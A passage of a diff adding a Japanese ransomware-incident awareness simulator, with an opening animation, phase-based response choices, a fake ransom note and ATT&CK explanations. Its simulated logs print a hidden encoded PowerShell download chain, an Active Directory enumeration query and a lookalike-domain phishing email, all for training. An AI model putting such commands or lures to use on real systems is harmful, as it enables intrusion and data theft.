+  bottom: 30px;
+  right: calc(50% + 200px);
+  z-index: 3;
+  opacity: 0;
+  transition: opacity 0.6s;
+}
+.cinema-char.show { opacity: 1; }
+.char-body {
+  font-size: 64px;
+  filter: drop-shadow(0 4px 16px rgba(0,0,0,0.8));
+  transform: scaleX(-1);
+}
+/* 吹き出し */
+.cinema-bubble {
+  position: absolute;
+  background: rgba(14, 22, 38, 0.95);
+  border: 1px solid rgba(56,189,248,0.3);
+  border-radius: 12px 12px 12px 2px;
+  padding: 10px 16px;
+  font-family: 'Noto Sans JP', sans-serif;
+  font-size: 14px;
+  color: #e8f0f8;
+  white-space: nowrap;
+  bottom: 90px;
+  left: 30px;
+  opacity: 0;
+  transform: translateY(6px);
+  transition: opacity 0.4s, transform 0.4s;
+  box-shadow: 0 4px 20px rgba(0,0,0,0.5);
+}
+.cinema-bubble::before {
+  content: '';
+  position: absolute;
+  bottom: -8px; left: 16px;
+  width: 0; height: 0;
+  border-left: 8px solid transparent;
+  border-right: 8px solid transparent;
+  border-top: 8px solid rgba(56,189,248,0.3);
+}
+.cinema-bubble.show {
+  opacity: 1;
+  transform: translateY(0);
+}
+/* マウスクリックエフェクト */
+.click-effect {
+  position: absolute;
+  width: 40px; height: 40px;
+  border: 2px solid var(--orange);
+  border-radius: 50%;
+  opacity: 0;
+  transform: scale(0);
+  pointer-events: none;
+  z-index: 10;
+}
+.click-effect.fire {
+  animation: click-ring 0.6s ease-out forwards;
+}
+@keyframes click-ring {
+  0%   { opacity: 1; transform: scale(0); }
+  100% { opacity: 0; transform: scale(3); }
+}
+/* タイトルカード */
+.cinema-title-card {
+  position: absolute; inset: 0;
+  display: flex; align-items: center; justify-content: center;
+  flex-direction: column; gap: 12px;
+  background: rgba(0,0,0,0.9);
+  opacity: 0;
+  transition: opacity 0.8s;
+  pointer-events: none;
+  z-index: 20;
+}
+.cinema-title-card.show { opacity: 1; }
+.cinema-title-card.hide { opacity: 0; }
+.ctc-sub  { font-family: 'IBM Plex Mono', monospace; font-size: 12px; letter-spacing: 0.2em; color: rgba(56,189,248,0.5); text-transform: uppercase; }
+.ctc-main { font-family: 'Oswald', sans-serif; font-size: clamp(22px,4vw,36px); font-weight: 700; color: #e8f0f8; letter-spacing: 0.1em; text-align:center; }
+.ctc-time { font-family: 'IBM Plex Mono', monospace; font-size: 22px; color: var(--orange); letter-spacing: 0.15em; }
+/* コーヒーカップ小道具 */
+.cinema-props {
+  position: absolute;
+  bottom: 35px;
+  right: calc(50% - 260px);
+  z-index: 2;
+  font-size: 28px;
+  opacity: 0.6;
+  filter: drop-shadow(0 2px 8px rgba(0,0,0,0.8));
+}
+
+/* 対応選択ヘッダー点滅 */
+@keyframes dec-blink {
+  0%, 100% { opacity: 1; box-shadow: none; }
+  50%       { opacity: 0.85; box-shadow: 0 0 14px rgba(251,146,60,0.5); }
+}
+.dec-head.needs-action {
+  animation: dec-blink 1.4s ease-in-out infinite;
+  background: rgba(251,146,60,0.06);
+  border-radius: 4px;
+  padding: 8px 10px;
+  border-bottom: none;
+  margin: -4px -4px 14px -4px;
+  border: 2px solid var(--orange);
+}
+/* 選択肢全体のハイライト枠 */
+@keyframes choices-glow {
+  0%, 100% { box-shadow: 0 0 0 0 rgba(251,146,60,0); }
+  50%       { box-shadow: 0 0 18px 4px rgba(251,146,60,0.18); }
+}
+#decision-panel.needs-action {
+  animation: choices-glow 1.4s ease-in-out infinite;
+  border-right-color: var(--orange);
+}
+[data-theme="light"] #decision-panel.needs-action {
+  border-right-color: var(--orange);
+  box-shadow: inset -3px 0 0 var(--orange);
+}
+
+#enc-flash {
+  position: fixed; inset: 0; z-index: 700; pointer-events: none;
+  display: none; background: rgba(244,63,94,0.12);
+}
+/* -- Result Button -- */
+#result-btn-wrap {
+  display: none; position: fixed; bottom: 36px; left: 50%;
+  transform: translateX(-50%); z-index: 750;
+  flex-direction: column; align-items: center; gap: 10px;
+  animation: appear 0.5s ease;
+}
+.result-btn {
+  font-family: var(--head); font-size: 15px; letter-spacing: 0.2em;
+  padding: 16px 56px; border: none; cursor: pointer; text-transform: uppercase;
+  border-radius: 3px; box-shadow: 0 8px 48px rgba(0,0,0,0.8);
+  transition: filter 0.2s, transform 0.15s;
+}
+.result-btn:hover   { filter: brightness(1.2); transform: translateY(-3px); }
+.result-btn.success { background: var(--green); color: #000; }
+.result-btn.danger  { background: var(--red);   color: #fff; }
+.result-btn-hint    { font-family: var(--mono); font-size: 11px; color: rgba(200,220,255,0.35); letter-spacing: 0.1em; }
+
+</style>
+</head>
+<body>
+
+<div id="enc-flash"></div>
+
+<!-- ══ OPENING CINEMA ══ -->
+<div id="opening-screen">
+  <!-- シネマバー -->
+  <div class="cinema-bars">
+    <div class="cinema-bar-top"></div>
+    <div class="cinema-bar-bottom"></div>
+  </div>
+  <!-- タイトルカード（最初） -->
+  <div class="cinema-title-card show" id="ctc-intro">
+    <div class="ctc-sub">Security Awareness Simulator</div>
+    <div class="ctc-main">マモール株式会社<br>202×年10月 某日</div>
+  </div>
+  <!-- タイトルカード（2週間後） -->
+  <div class="cinema-title-card" id="ctc-later">
+    <div class="ctc-sub">そして</div>
+    <div class="ctc-time">…2週間後</div>
+  </div>
+  <!-- メインシーン -->
+  <div class="cinema-scene">
+    <div class="cinema-bg"></div>
+    <div class="cinema-desk"></div>
+    <div class="cinema-props">☕</div>
+    <!-- キャラクター -->
+    <div class="cinema-char" id="cin-char">
+      <div class="cinema-bubble" id="cin-bubble"></div>
+      <div class="char-body">🧑‍💼</div>
+    </div>
+    <!-- モニター -->
+    <div class="cinema-monitor">
+      <div class="monitor-body">
+        <div class="monitor-screen" id="cin-screen">
+          <div class="monitor-email-line" id="em-1">受信トレイ (3)</div>
+          <div class="monitor-email-line" id="em-2" style="color:#4a6a88;">────────────────────</div>
+          <div class="monitor-email-line" id="em-3">From: 田中 &lt;<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="bfccded3daccffcbded1ded4de92d6d1dc91dcd091d5cf">[email&#160;protected]</a>&gt;</div>
+          <div class="monitor-email-line" id="em-4">Re: 先月の打合せの件</div>
+          <div class="monitor-email-line" id="em-5" style="margin-top:8px;">From: 総務部 &lt;<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="60130f150d15200d010d0f12154d030f12104e030f4e0a10">[email&#160;protected]</a>&gt;</div>
+          <div class="monitor-email-line" id="em-6">From: 丸山精機 &lt;<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="e688899483968a9fa68b878b899493cb85899496c88589c88c96c89493">[email&#160;protected]</a>&gt;</div>
+          <div class="monitor-email-line" id="em-7" style="margin-top:8px; background:rgba(56,189,248,0.06); padding:6px 8px; border-left:2px solid rgba(56,189,248,0.3);">
+            <span id="em-from" class="monitor-email-line" style="opacity:0; color:#c8d8e8;">From: 丸山精機 &lt;<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="c3adacb1a6b3afba83aea2aeacb1b6eea0acb1b3eda0aceda9b3">[email&#160;protected]</a><b style="color:#fb923c">.ru</b>&gt;</span>
+            <span id="em-subj" class="monitor-email-line subject" style="opacity:0;">件名: 【重要】取引先からの見積書</span><br>
+            <span id="em-att"  class="monitor-email-line attach" style="opacity:0;">📎 見積書_2024.xlsx</span>
+          </div>
+          <div class="click-effect" id="cin-click" style="top:calc(50% + 20px); left:50%;"></div>
+        </div>
+      </div>
+      <div class="monitor-stand"></div>
+      <div class="monitor-base"></div>
+    </div>
+  </div>
+</div>
+
+<div id="result-btn-wrap"><button id="result-btn" class="result-btn"></button><span class="result-btn-hint">説明を読み終えたらクリックしてください</span></div>
+
+<!-- ══ START SCREEN ══ -->
+<div id="start-screen">
+  <div class="start-inner">
+    <h1>ランサムウェア<br>インシデント体験</h1>
+    <div class="start-sub">SECURITY AWARENESS SIMULATOR // v5.0</div>
+    <div class="start-card">
+      <h2>// シナリオ概要</h2>
+      <p>
+        あなたは<strong>中堅製造業「マモール株式会社」のIT担当者</strong>です。<br>
+        ある月曜の朝、いくつかの不審なアラートが届き始めました。
+      </p>
+      <p>
+        攻撃者はすでに<strong>2週間前から社内に潜伏</strong>しており、この日から本格的な攻撃フェーズに移行しています。<br>
+        あなたの判断次第で<strong>被害を阻止できることも、全滅することもあります。</strong>
+      </p>
+      <div class="sc-steps">
+        <div class="sc-s"><span class="sn">Phase 1</span>侵入<br>（2週間前）</div>
+        <div class="sc-s"><span class="sn">Phase 2</span>潜伏<br>偵察</div>
+        <div class="sc-s"><span class="sn">Phase 3</span>権限<br>昇格</div>
+        <div class="sc-s"><span class="sn">Phase 4</span>拡散<br>探索</div>
+        <div class="sc-s"><span class="sn">Phase 5</span>データ<br>流出</div>
+        <div class="sc-s"><span class="sn">Phase 6</span>暗号化<br>要求</div>
+      </div>
+      <p style="color:var(--orange); font-size:12.5px;">⚠ 選択肢には「何もしない」も含まれます。何もしないほど被害は静かに、しかし確実に広がります。<br>早期に正しい対応ができれば、ランサムウェアの発動を防ぐことも可能です。</p>
+    </div>
+    <div class="warn-strip">⚠ このシミュレーターは教育目的です。実際の攻撃手法を体験的に学ぶためのコンテンツです。</div>
+    <button class="btn-start" onclick="startGame()">▶ シミュレーション開始</button>
+  </div>
+</div>
+
+<!-- ══ END SCREEN ══ -->
+<div id="end-screen">
+  <div class="end-popup">
+    <!-- 全面被害時の身代金ノート -->
+    <div class="ransom-note" id="ransom-note">
+      <h2>!!! YOUR FILES HAVE BEEN ENCRYPTED !!!</h2>
+      <div class="rn-body">
+        マモール株式会社のすべてのファイルサーバー・バックアップは<br>
+        軍事グレード暗号で完全にロックされました。<br><br>
+        <strong style="color:#fff; font-size:16px;">身代金: 50 BTC（約3億5千万円）</strong><br>
+        お支払い期限：72時間以内
+      </div>
+      <div class="rn-id">VICTIM ID: MAMORU-2024-0B3F &nbsp;|&nbsp; DATA STOLEN: 3.2 TB</div>
+      <div style="font-size:12px; color:var(--muted); margin-bottom:18px;">
+        顧客データ・設計図面・財務情報 3.2TBを既に窃取済みです。<br>支払いがない場合は72時間後にダークウェブへ公開します。
+      </div>
+      <div class="rn-btns">
+        <button class="rn-btn pay"   onclick="endGame('pay')">💰 身代金を支払う</button>
+        <button class="rn-btn nopay" onclick="endGame('nopay')">🛡 支払わずに復旧する</button>
+      </div>
+    </div>
+    <!-- 結果レポート -->
+    <div class="result-card"  id="result-card"></div>
+    <!-- 阻止成功時 -->
+    <div class="success-card" id="success-card"></div>
+  </div>
+</div>
+
+<!-- ══ TOPBAR ══ -->
+<div id="topbar">
+  <h1>RANSOMWARE SIMULATOR</h1>
+  <div class="tag">マモール株式会社 / SOC CONSOLE</div>
+  <div id="theme-toggle" onclick="toggleTheme()">
+    <span class="toggle-icon">🌙</span>
+    <div class="toggle-track on" id="toggle-track"><div class="toggle-thumb"></div></div>
+    <span class="toggle-icon">☀️</span>
+  </div>
+  <div class="kpi-strip">
+    <div class="kpi-item">
+      <span class="kpi-name">システム健全性</span>
+      <span class="kpi-val" id="v-si" style="color:var(--green)">100%</span>
+      <div class="kpi-bar-wrap"><div class="kpi-bar" id="b-si" style="width:100%;background:var(--green)"></div></div>
+    </div>
+    <div class="kpi-item">
+      <span class="kpi-name">組織信頼度</span>
+      <span class="kpi-val" id="v-rt" style="color:var(--cyan)">100%</span>
+      <div class="kpi-bar-wrap"><div class="kpi-bar" id="b-rt" style="width:100%;background:var(--cyan)"></div></div>
+    </div>
+    <div class="kpi-item">
+      <span class="kpi-name">対応リソース</span>
+      <span class="kpi-val" id="v-br" style="color:var(--orange)">100%</span>
+      <div class="kpi-bar-wrap"><div class="kpi-bar" id="b-br" style="width:100%;background:var(--orange)"></div></div>
+    </div>
+  </div>
+</div>
+
+<!-- ══ PHASE BAR ══ -->
+<div id="phase-row">
+  <div class="ph" id="ph1"><div class="ph-dot">1</div><div class="ph-info"><div class="ph-num">PHASE 1</div><div class="ph-name">初期侵入</div></div><div class="ph-line"></div></div>
+  <div class="ph" id="ph2"><div class="ph-dot">2</div><div class="ph-info"><div class="ph-num">PHASE 2</div><div class="ph-name">潜伏・偵察</div></div><div class="ph-line"></div></div>
+  <div class="ph" id="ph3"><div class="ph-dot">3</div><div class="ph-info"><div class="ph-num">PHASE 3</div><div class="ph-name">権限昇格</div></div><div class="ph-line"></div></div>
+  <div class="ph" id="ph4"><div class="ph-dot">4</div><div class="ph-info"><div class="ph-num">PHASE 4</div><div class="ph-name">横断拡散</div></div><div class="ph-line"></div></div>
+  <div class="ph" id="ph5"><div class="ph-dot">5</div><div class="ph-info"><div class="ph-num">PHASE 5</div><div class="ph-name">データ流出</div></div><div class="ph-line"></div></div>
+  <div class="ph" id="ph6"><div class="ph-dot">6</div><div class="ph-info"><div class="ph-num">PHASE 6</div><div class="ph-name">暗号化・要求</div></div></div>
+</div>
+
+<!-- ══ WORKSPACE ══ -->
+<div id="workspace">
+
+  <!-- COL 1: Decision -->
+  <div id="decision-panel">
+    <div class="dec-head">対応を選択してください</div>
+    <div id="d-prompt"></div>
+    <div id="choices-container">
+      <div class="idle-msg">WAITING FOR<br>INCIDENT...</div>
+    </div>
+  </div>
+
+  <!-- COL 2: Log + Assets -->
+  <div id="left-col">
+    <div id="log-panel"><div id="log-container"></div></div>
+    <div id="asset-panel">
+      <div class="asset-title">🖥 システム状態マップ</div>
+      <div class="asset-grid">
+        <div class="asset-node" id="a-email">
+          <div class="a-icon">📧</div><div class="a-name">メールサーバー</div><div class="a-stat" id="st-email">正常稼働</div>
+        </div>
+        <div class="asset-node" id="a-pc">
+          <div class="a-icon">💻</div><div class="a-name">PC端末群</div><div class="a-stat" id="st-pc">正常稼働</div>
+        </div>
+        <div class="asset-node" id="a-ad">
+          <div class="a-icon">🏛</div><div class="a-name">Active Directory</div><div class="a-stat" id="st-ad">正常稼働</div>
+        </div>
+        <div class="asset-node" id="a-file">
+          <div class="a-icon">📁</div><div class="a-name">ファイルサーバー</div><div class="a-stat" id="st-file">正常稼働</div>
+        </div>
+        <div class="asset-node" id="a-backup">
+          <div class="a-icon">💾</div><div class="a-name">バックアップ</div><div class="a-stat" id="st-backup">正常稼働</div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- COL 3: Tech Panel -->
+  <div id="tech-panel">
+    <div class="panel-head">攻撃手法の解説</div>
+    <div id="tech-idle" class="tech-idle">
+      <div class="ti-icon">🔍</div>
+      <p>インシデントが発生すると、ここに攻撃手法の詳細解説が表示されます</p>
+    </div>
+    <div id="tech-content" style="display:none;"></div>
+  </div>
+
+</div>
+
+<script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script>
+
+// ── テーマ切り替え ──────────────────────────
+function toggleTheme() {
+  const root  = document.documentElement;
+  const track = document.getElementById('toggle-track');
+  const isLight = root.getAttribute('data-theme') === 'light';
+  if (isLight) {
+    root.removeAttribute('data-theme');
+    track.classList.remove('on');
+  } else {
+    root.setAttribute('data-theme', 'light');
+    track.classList.add('on');
+  }
+}
+
+const sleep = ms => new Promise(r => setTimeout(r, ms));
+let stats = { si: 100, rt: 100, br: 100 };
+let score = 0;
+const MAX_SCORE = 5;
+
+// 累積的な「封じ込め度」を追跡する状態
+// 各フェーズで適切に対応できたかを記録
+const state = {
+  p1_contained: false,   // Phase1でPC隔離したか
+  p2_ad_secured: false,  // Phase2でADアカウントをリセットしたか
+  p3_creds_reset: false, // Phase3で管理者アカウントをリセットしたか
+  p4_net_isolated: false,// Phase4でネットワーク全体を隔離したか
+  p5_exfil_stopped: false,// Phase5でデータ流出を止めたか
+  exfil_mb: 0,           // 流出データ量
+};
+
+// ── UI HELPERS ──
+
+function setPhase(n, mode = 'active') {
+  for (let i = 1; i <= 6; i++) {
+    const el = document.getElementById('ph' + i);
+    el.classList.remove('active', 'done', 'danger', 'stopped');
+    if (i < n) el.classList.add('done');
+  }
+  if (n >= 1 && n <= 6)
+    document.getElementById('ph' + n).classList.add(mode);
+}
+
+function updateStats(dsi, drt, dbr) {
+  stats.si = Math.max(0, Math.min(100, stats.si + dsi));
+  stats.rt = Math.max(0, Math.min(100, stats.rt + drt));
+  stats.br = Math.max(0, Math.min(100, stats.br + dbr));
+  const siC = stats.si > 60 ? 'var(--green)' : stats.si > 30 ? 'var(--orange)' : 'var(--red)';
+  const rtC = stats.rt > 60 ? 'var(--cyan)'  : stats.rt > 30 ? 'var(--orange)' : 'var(--red)';
+  const brC = stats.br > 60 ? 'var(--orange)': stats.br > 30 ? 'var(--yellow)' : 'var(--red)';
+  ['si','rt','br'].forEach((k,i) => {
+    const c = [siC,rtC,brC][i];
+    document.getElementById('v-'+k).textContent = stats[k]+'%';
+    document.getElementById('v-'+k).style.color = c;
+    document.getElementById('b-'+k).style.cssText = `width:${stats[k]}%;background:${c}`;
+  });
+}
+
+function log(source, badgeCls, badgeTxt, body, bodyCls = '') {
+  const c = document.getElementById('log-container');
+  const d = document.createElement('div');
+  d.className = 'log-entry';
+  const t = new Date().toLocaleTimeString('ja-JP', {hour12: false});
+  d.innerHTML = `
+    <div class="log-left">
+      <span class="log-time">${t}</span>
+      <span class="log-source">${source}</span>
+      <span class="log-badge ${badgeCls}">${badgeTxt}</span>
+    </div>
+    <div class="log-body ${bodyCls}">${body}</div>
+  `;
+  c.appendChild(d);
+  document.getElementById('log-panel').scrollTop = 999999;
+}
+
+function divider(label, cls = '') {
+  const c = document.getElementById('log-container');
+  const d = document.createElement('div');
+  d.className = 'log-divider ' + cls;
+  d.innerHTML = `<div class="dl"></div><div class="dt">${label}</div><div class="dl"></div>`;
+  c.appendChild(d);
+  document.getElementById('log-panel').scrollTop = 999999;
+}
+
+function setAsset(id, state_cls, status) {
+  const el = document.getElementById('a-' + id);
+  el.className = 'asset-node' + (state_cls ? ' ' + state_cls : '');
+  document.getElementById('st-' + id).textContent = status;
+}
+
+function setTech(html) {
+  document.getElementById('tech-idle').style.display = 'none';
+  const tc = document.getElementById('tech-content');
+  tc.style.display = 'block';
+  tc.innerHTML = html;
+  document.getElementById('tech-panel').scrollTop = 0;
+}
+
+function showChoices(prompt, choices) {
+  const dp = document.getElementById('d-prompt');
+  if (prompt) { dp.innerHTML = prompt; dp.style.display = 'block'; }
+  else dp.style.display = 'none';
+  const cc = document.getElementById('choices-container');
+  cc.innerHTML = '';
+  // 点滅アクティブ化
+  document.getElementById('decision-panel').classList.add('needs-action');
+  document.querySelector('.dec-head').classList.add('needs-action');
+  choices.forEach(c => {
+    const btn = document.createElement('button');
+    btn.className = 'choice-btn' + (c.isNothing ? ' nothing' : '');
+    const rc = c.risk === 'high' ? 'rh' : c.risk === 'med' ? 'rm' : c.risk === 'low' ? 'rl' : 'rn';
+    const rt = c.risk === 'high' ? '⚠ HIGH RISK' : c.risk === 'med' ? '△ MEDIUM RISK' : c.risk === 'low' ? '✓ LOW RISK' : '— 対応なし';
+    btn.innerHTML = `<span class="cl">${c.label}</span><span class="cd">${c.desc}</span><span class="cr ${rc}">${rt}</span>`;
+    btn.onclick = () => {
+      cc.innerHTML = '<div class="idle-msg">処理中...</div>';
+      dp.style.display = 'none';
+      document.getElementById('decision-panel').classList.remove('needs-action');
+      document.querySelector('.dec-head').classList.remove('needs-action');
+      c.action();
+    };
+    cc.appendChild(btn);
+  });
+}
+
+
+// ── オープニング演出 ──────────────────────────
+async function playOpening() {
+  const screen = document.getElementById('opening-screen');
+  screen.style.display = 'flex';
+
+  const show = (id, delay=0) => new Promise(r => setTimeout(() => {
+    const el = document.getElementById(id);
+    if (el) { el.style.opacity = '1'; el.style.transform = 'none'; }
+    r();
+  }, delay));
+
+  const hide = (id, delay=0) => new Promise(r => setTimeout(() => {
+    const el = document.getElementById(id);
+    if (el) { el.style.opacity = '0'; }
+    r();
+  }, delay));
+
+  const bubble = (text, delay=0) => new Promise(r => setTimeout(() => {
+    const b = document.getElementById('cin-bubble');
+    b.textContent = text;
+    b.classList.add('show');
+    r();
+  }, delay));
+
+  const hideBubble = (delay=0) => new Promise(r => setTimeout(() => {
+    document.getElementById('cin-bubble').classList.remove('show');
+    r();
+  }, delay));
+
+  // ─ シーン1: タイトルカード ─
+  await sleep(1400);
+  await hide('ctc-intro', 0);
+  await sleep(900);
+
+  // ─ シーン2: 宇津狩氏が登場 ─
+  show('cin-char', 0);
+  await sleep(600);
+
+  // メールリスト表示
+  for (let i=1; i<=6; i++) {
+    document.getElementById('em-'+i).classList.add('show');
+    await sleep(80);
+  }
+  await sleep(400);
+
+  // セリフ①
+  await bubble('おや。「丸山精機」から見積書が届いたぞ');
+  await sleep(2200);
+  await hideBubble();
+  await sleep(400);
+
+  // 不審メール強調表示
+  document.getElementById('em-from').style.opacity = '1';
+  await sleep(200);
+  document.getElementById('em-subj').style.opacity = '1';
+  await sleep(200);
+  document.getElementById('em-att').style.opacity  = '1';
+  await sleep(600);
+
+  // セリフ②
+  await bubble('ちょうどよかった。ポチっとな');
+  await sleep(1800);
+
+  // クリックエフェクト
+  await hideBubble();
+  await sleep(300);
+  const clickEl = document.getElementById('cin-click');
+  clickEl.style.opacity = '0';
+  clickEl.classList.add('fire');
+  await sleep(700);
+
+  // セリフ③ （軽い声）
+  await bubble('…ん？ 何も開かないな。まあいいか');
+  await sleep(2200);
+  await hideBubble();
+  await sleep(500);
+
+  // ─ シーン3: 時間経過タイトル ─
+  const ctcLater = document.getElementById('ctc-later');
+  ctcLater.classList.add('show');
+  await sleep(2200);
+  ctcLater.classList.add('hide');
+  await sleep(800);
+
+  // ─ フェードアウトしてゲーム開始 ─
+  screen.style.transition = 'opacity 0.7s';
+  screen.style.opacity = '0';
+  await sleep(750);
+  screen.style.display = 'none';
+  screen.style.opacity = '1';
+  screen.style.transition = '';
+}
+
+// ══ PHASE 1: 初期侵入 ══════════════════════════════════════════
+async function startGame() {
+  document.getElementById('start-screen').style.display = 'none';
+  await playOpening();
+  await sleep(300);
+  divider('SYSTEM BOOT — 監視開始', 'phase');
+  log('SOC Console', 'b-ok', 'SYSTEM', 'セキュリティ監視システムを起動しました。ログ収集を開始します。', 'ok');
+  await sleep(1200);
+
+  setPhase(1);
+  divider('PHASE 1 — 初期侵入 (T1566: Phishing Attachment)', 'phase');
+  await sleep(600);
+
+  log('メールゲートウェイ', 'b-normal', 'INFO',
+    `<b>【2週間前の記録】</b> 社員・宇津狩氏に業務メール着信<br>
+     差出人: <span style="color:var(--orange)">noreply@mamoru-corp.co.jp<b>.ru</b></span>（類似ドメイン）<br>
+     件名:「【重要】取引先からの見積書」<br>
+     添付: <span style="color:#fca5a5">見積書_2024.xlsx</span>（マクロ有効ファイル）`);
+  await sleep(1200);
+  log('EDR [Endpoint]', 'b-warn', 'WARNING',
+    `宇津狩氏のPC — Excelファイル開封後に不審なプロセス起動を検知<br>
+     <span class="log-code"><span class="hd">EXCEL.EXE</span> → <span class="ho">mshta.exe</span> → <span class="hr">powershell.exe -nop -w hidden -enc JABj...</span>
+<span class="hd">→ 外部C2サーバーからバックドアをダウンロード中</span></span>`, 'warn');
+
+  setAsset('email', 'warn', '不審メール確認');
+  setAsset('pc', 'warn', '1台 要確認');
+
+  setTech(`
+    <div class="tech-ph-title">フィッシングによる初期侵入</div>
+    <div class="tech-attck">ATT&CK: T1566.001 — Spearphishing Attachment</div>
+    <div class="tech-desc">
+      実在する取引先を装った「類似ドメイン」からメールを送り、<b>マクロ付きExcelを開かせます。</b>
+      「mamoru-corp.co.jp<b>.ru</b>」のように末尾に別ドメインを追加しただけで、メール画面では気づきにくいです。
+      マクロが実行されると外部のC2サーバーからバックドアが自動インストールされます。
+    </div>
+    <div class="impact-head">いま何が起きているか</div>
+    <ul class="impact-list">
+      <li>宇津狩氏PCにバックドアがインストールされた</li>
+      <li>攻撃者は宇津狩氏PCをリモート操作できる状態</li>
+      <li>表向きは「1台のPCが少し重い」だけに見える</li>
+      <li><b>この段階で封じ込めれば被害は1台で完全に止まる</b></li>
+    </ul>
+    <div class="tech-tip">
+      <div class="tech-tip-head">💡 気づけたポイント</div>
+      <p>送信元ドメインの末尾「.ru」、EDRの異常プロセスアラート。<b>ここでPC隔離すれば次のフェーズへの侵攻を完全に防げます。</b></p>
+    </div>
+  `);
+
+  showChoices(
+    '⚠ 宇津狩氏のPCで不審なマクロ実行を検知。<b>2週間前のアラート</b>ですが、今朝まで見落としていました。',
+    [
+      {
+        label: 'A: 宇津狩氏のPCをネットワーク隔離する',
+        desc: 'EDRでPCをネットワークから切断。バックドア通信を遮断し、被害を1台に封じ込める。',
+        risk: 'low',
+        action: async () => {
+          log('SOC', 'b-action', 'DECISION', '[対応A] 宇津狩氏PC をネットワーク隔離', 'action');
+          await sleep(800);
+          log('EDR', 'b-ok', 'SUCCESS', 'PC-UTSUGARI を隔離完了。外部C2通信を遮断しました。', 'ok');
+          await sleep(600);
+          log('SOC', 'b-warn', 'NOTICE', '隔離まで2週間経過。その間に偵察が完了した可能性がある点に注意してください。', 'warn');
+          setAsset('pc', 'offline', '宇津狩氏PC: 隔離済');
+          state.p1_contained = true;
+          updateStats(0, 5, 0);
+          score += 1;
+          await phase2();
+        }
+      },
+      {
+        label: 'B: 宇津狩氏にヒアリングのみ実施',
+        desc: 'PCはそのままに、宇津狩氏に状況を聞いて様子を見る。',
+        risk: 'med',
+        action: async () => {
+          log('SOC', 'b-action', 'DECISION', '[対応B] 宇津狩氏へヒアリング実施', 'action');
+          await sleep(800);
+          log('宇津狩氏', 'b-normal', 'USER', '「特に問題は感じていません。ファイルを開いたら何も表示されませんでした」');
+          await sleep(800);
+          log('EDR', 'b-warn', 'WARNING', 'バックドア通信は継続中。攻撃者は内部偵察を続けています。', 'warn');
+          setAsset('pc', 'compromised', '宇津狩氏PC: 侵害中');
+          updateStats(-10, 0, 0);
+          await phase2();
+        }
+      },
+      {
+        label: '— 何もしない（後で対応しようと思う）',
+        desc: '今は別の業務で手が離せない。優先度を下げて後回しにする。',
+        risk: 'high',
+        isNothing: true,
+        action: async () => {
+          log('SOC', 'b-warn', 'SKIPPED', '[対応なし] アラートを未対応のまま放置', 'warn');
+          await sleep(800);
+          log('EDR', 'b-crit', 'ALERT', '未対応の間、攻撃者はバックドア経由で内部偵察を開始しました。', 'crit');
+          setAsset('pc', 'compromised', '宇津狩氏PC: 侵害中');
+          updateStats(-20, -5, 0);
+          await phase2();
+        }
+      }
+    ]
+  );
+}
+
+// ══ PHASE 2: 潜伏・偵察 ═══════════════════════════════════════
+async function phase2() {
+  const danger = !state.p1_contained;
+  setPhase(2, danger ? 'danger' : 'active');
+  await sleep(1500);
+  divider('PHASE 2 — 潜伏・内部偵察 (T1018: Network Discovery)', danger ? 'danger' : 'phase');
+  await sleep(600);
+
+  if (danger) {
+    log('Network IDS', 'b-crit', 'ALERT',
+      `内部ネットワーク 192.168.1.0/24 へのポートスキャンを検知<br>
+       発信元: <span style="color:#fca5a5">192.168.1.45</span>（PC-UTSUGARI）<br>
+       対象: 445/TCP(SMB), 3389/TCP(RDP), 389/TCP(LDAP)`, 'crit');
+    await sleep(1000);
+    log('AD Monitor', 'b-warn', 'WARNING',
+      `Active Directory への大量LDAPクエリを検知<br>
+       <span class="log-code"><span class="hr">ldapsearch -b "DC=mamoru,DC=local" "(objectClass=user)"</span>
+<span class="hd">→ 全ユーザー・グループ・権限情報を照会中</span></span>`, 'warn');
+    setAsset('ad', 'warn', '不審なクエリ検知');
+  } else {
+    log('Network IDS', 'b-normal', 'INFO', 'PC-UTSUGARI からの外部通信はありません。隔離措置が有効に機能しています。', 'ok');
+    await sleep(800);
+    log('Threat Intel', 'b-warn', 'WARNING', '念のため、他の社員への類似フィッシングメール送信がなかったか確認を推奨します。', 'warn');
+    setAsset('ad', 'warn', '念のため監視中');
+  }
+
+  setTech(`
+    <div class="tech-ph-title">潜伏・内部偵察</div>
+    <div class="tech-attck">ATT&CK: T1018 / T1069 / T1087 — Discovery</div>
+    <div class="tech-desc">
+      攻撃者はバックドアを通じて<b>静かに社内を地図化</b>します。
+      どこにファイルサーバーがあるか、誰が管理者か、バックアップはどこかを調査します。
+      正常な業務トラフィックと区別がつきにくいため、<b>この段階は特に見落としやすいです。</b>
+    </div>
+    <div class="impact-head">いま何が起きているか</div>
+    <ul class="impact-list">
+      ${danger ? '<li>社内ネットワーク全体のIP・ホスト情報を収集中</li><li>Active Directoryから管理者アカウントのリストを取得中</li><li>ファイルサーバー・バックアップサーバーの場所を特定中</li>' : '<li>PC隔離により偵察活動を大幅に抑制できている</li><li>攻撃者は別経路の侵入を検討している可能性がある</li>'}
+      <li>この段階を見逃すと次のフェーズで被害が一気に拡大する</li>
+    </ul>
+    <div class="tech-tip">
+      <div class="tech-tip-head">💡 気づけたポイント</div>
+      <p>内部スキャン・LDAPクエリ多発。<b>「内部通信だから安全」という思い込みが最大のリスク</b>です。</p>
+    </div>
+  `);
+
+  showChoices(
+    danger
+      ? '⚠ PC-UTSUGARIが社内全サーバーをスキャン中。攻撃者が組織の内部構造を把握しようとしています。'
+      : '隔離措置は有効ですが、念のため全体的な確認を行いましょう。',
+    [
+      {
+        label: 'A: 全サービスアカウントのパスワードをリセット',
+        desc: 'ADで収集された可能性のある認証情報を無効化する。攻撃者の次の侵攻を困難にする。',
+        risk: 'low',
+        action: async () => {
+          log('SOC', 'b-action', 'DECISION', '[対応A] サービスアカウント パスワード一括リセット', 'action');
+          await sleep(1000);
+          log('AD Admin', 'b-ok', 'SUCCESS', '22件のサービスアカウントのパスワードをリセット完了。', 'ok');
+          setAsset('ad', '', '正常稼働');
+          state.p2_ad_secured = true;
+          updateStats(5, 0, 0);
+          score += 1;
+          await phase3();
+        }
+      },
+      {
